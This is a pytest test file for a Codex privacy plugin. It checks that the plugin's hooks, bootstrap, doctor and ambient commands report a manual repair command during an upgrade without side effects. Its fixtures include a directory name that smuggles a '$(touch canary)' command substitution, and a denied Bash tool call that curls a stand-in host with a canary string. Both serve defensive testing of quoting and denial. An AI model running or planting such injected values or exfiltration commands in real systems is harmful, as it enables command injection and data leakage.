"""Upgrade-window recovery without real processes, sockets or user state."""

from __future__ import annotations

import importlib.util
import io
import json
import shlex
from pathlib import Path
from types import SimpleNamespace

import pytest

from privacy_hud import ambient, doctor
from privacy_hud import runtime_contract as contract
from privacy_hud import runtime_messages as messages
from privacy_hud import runtime_repair as repair

REPO = Path(__file__).resolve().parents[1]


def load_module(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def gap(tmp_path, monkeypatch):
    root = tmp_path.resolve()
    monkeypatch.setenv("HOME", str(root / "home"))
    monkeypatch.setenv("CODEX_HOME", str(root / "codex"))

    data = root / "data ' $(touch canary) `quoted`"
    data.mkdir()
    monkeypatch.setenv("PLUGIN_DATA", str(data))

    parent = (
        root / "codex" / "plugins" / "cache" / "market" / "codex-privacy-hud")
    old = parent / "0.9.0"
    new = parent / contract.RELEASE
    (new / "scripts").mkdir(parents=True)
    (new / "scripts" / "runtime.py").touch()
    (new / "install.sh").touch()
    manifest = contract.build_manifest(new)
    (new / contract.MANIFEST_NAME).write_text(
        contract.render_manifest(manifest), encoding="utf-8")

    python = root / "environment" / "bin" / "python"
    python.parent.mkdir(parents=True)
    python.touch()
    python.chmod(0o700)

    receipt = {
        "v": contract.RECEIPT_VERSION,
        "python": str(python),
        "env": {},
        "dependency_probe": {},
        "selected_bundle_root": str(old),
        "selected_build_id": "a" * 64,
        "activation_epoch": "b" * 32,
        "storage_generation": contract.STORAGE_GENERATION,
        "recorded_at": 0.0,
    }
    receipt_path = data / contract.RECEIPT_NAME
    receipt_path.write_text(json.dumps(receipt), encoding="utf-8")
    receipt_path.chmod(0o600)

    handler = load_module(
        "_issue74_handler", REPO / "hooks" / "handler.py")
    bootstrap = load_module(
        "_issue74_bootstrap", REPO / "scripts" / "runtime.py")

    def forbidden(*args, **kwargs):
        pytest.fail("upgrade reporting attempted a runtime side effect")

    monkeypatch.setattr(handler, "_bundle_root", lambda: str(new))
    monkeypatch.setattr(handler, "_spawn_daemon", forbidden)
    monkeypatch.setattr(handler.socket, "socket", forbidden)
    monkeypatch.setattr(repair, "repair_runtime", forbidden)
    monkeypatch.setattr(repair, "_signal", forbidden)
    monkeypatch.setattr(repair, "process_identity", forbidden)
    monkeypatch.setattr(bootstrap, "BUNDLE_ROOT", new)
    monkeypatch.setattr(bootstrap, "_standalone_contract", lambda: contract)
    monkeypatch.setattr(bootstrap, "_reexec", forbidden)
    monkeypatch.setattr(bootstrap, "_enter_selected", forbidden)
    monkeypatch.setattr(bootstrap, "_load_mcp_server", forbidden)

    return SimpleNamespace(
        root=root, data=data, old=old, new=new, receipt=receipt_path,
        handler=handler, bootstrap=bootstrap)


@pytest.mark.parametrize("old_present", [False, True])
@pytest.mark.parametrize("payload, denied", [
    ({"hook_event_name": "SessionStart"}, False),
    ({"hook_event_name": "PostToolUse", "tool_response": "PRIVATE-CANARY"}, False),
    ({
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": "ls"},
    }, False),
    ({
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": "curl https://example.invalid/PRIVATE-CANARY"},
    }, True),
    ({
        "hook_event_name": "PreToolUse",
        "tool_name": "mcp__gitnexus__query",
        "tool_input": {"query": "PRIVATE-CANARY"},
    }, True),
])
def test_update_window_reports_external_repair_without_reselection(
        gap, monkeypatch, payload, denied, old_present):
    f = gap
    if old_present:
        f.old.mkdir()
    before = f.receipt.read_bytes()
    assert contract.load_identity(f.new).build_id

    monkeypatch.setattr(f.handler.sys, "stdin", io.StringIO(json.dumps(payload)))
    output = f.handler.main()

    if denied:
        decision = output["hookSpecificOutput"]
        assert decision["permissionDecision"] == "deny"
        text = decision["permissionDecisionReason"]
        assert "issued a denial" in text
    else:
        assert "hookSpecificOutput" not in output
        text = output["systemMessage"]

    command = repair.format_repair_command(f.new, f.data)
    assert command in text
    assert "repair is not automatic" in text
    assert "another terminal" in text
    assert "may download dependencies and model weights" in text
    assert "PRIVATE-CANARY" not in text
    assert str(f.old) not in text
    assert "{repair_command}" not in text
    assert shlex.split(command) == [
        "sh", str(f.new / "install.sh"),
        "--repair-runtime", "--plugin-data", str(f.data), "--yes",
    ]
    assert f.receipt.read_bytes() == before
    assert sorted(p.name for p in f.data.iterdir()) == [contract.RECEIPT_NAME]


def test_hook_recovery_template_matches_package(gap):
    assert gap.handler.RUNTIME_REPAIR_REQUIRED == messages.RUNTIME_REPAIR_REQUIRED
    assert gap.handler._repair_command(str(gap.data)) == \
        repair.format_repair_command(gap.new, gap.data)


@pytest.mark.parametrize("command", ["doctor", "mcp", "ambient"])
def test_bootstrap_refusal_names_the_current_bundle_command(
        gap, capsys, command):
    f = gap
    before = f.receipt.read_bytes()

    assert f.bootstrap.main(
        ["--plugin-data", str(f.data), command]) == 1

    captured = capsys.readouterr()
    text = captured.err if command == "mcp" else captured.out
    assert repair.format_repair_command(f.new, f.data) in text
    assert str(f.old) not in text
    assert "{repair_command}" not in text
    if command == "mcp":
        assert captured.out == ""
        assert "no ledger was opened" in captured.err
    elif command == "doctor":
        assert "[FAIL] Runtime setup" in text
        assert "repair is not automatic" in text
    else:
        assert "Privacy — runtime mismatch" in text
        assert "another terminal" in text
    assert f.receipt.read_bytes() == before


def test_doctor_setup_check_keeps_the_external_repair_surface(
        gap, monkeypatch):
    monkeypatch.setattr(doctor.runtime, "plugin_data_dir", lambda: gap.data)
    monkeypatch.setattr(doctor, "_bundle_root", lambda: gap.new)

    check = doctor.check_runtime_source()

    assert check.status == doctor.FAIL
    assert "repair is not automatic" in check.summary
    assert repair.format_repair_command(gap.new, gap.data) in \
        "\n".join(check.fixes)


def test_ambient_refusal_has_a_hint_and_narrow_fallback():
    assert ambient._refusal_line(100) == \
        "Privacy — runtime mismatch; run $privacy repair"
    narrow = messages.AMBIENT_NARROW_FALLBACK
    assert ambient._refusal_line(len(narrow)) == narrow
    assert ambient._refusal_line(len(narrow) - 1) is None
